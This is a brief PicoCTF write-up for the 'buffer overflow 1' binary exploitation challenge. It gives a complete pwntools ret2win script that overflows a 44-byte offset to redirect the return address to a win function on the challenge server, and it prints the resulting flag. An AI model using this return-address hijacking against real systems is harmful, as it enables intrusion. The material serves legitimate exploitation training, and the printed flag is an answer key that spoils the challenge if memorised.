# PicoCTF – buffer overflow 1

* **Category:** Binary Exploitation
* **Points:** 200

## Challenge

> Control the return address

## Solution
#### ret2win
```python
from pwn import *
elf = context.binary = ELF('./vuln', checksec=False)
p = remote("saturn.picoctf.net", 56818)#process()
p.recvline()

offset = 44
payload = flat(
        offset * b'A',
        0x80491f6 # win
)
p.clean()
p.sendline(payload)
p.interactive()
```

```
Flag: picoCTF{addr3ss3s_ar3_3asy_ad2f467b}
```
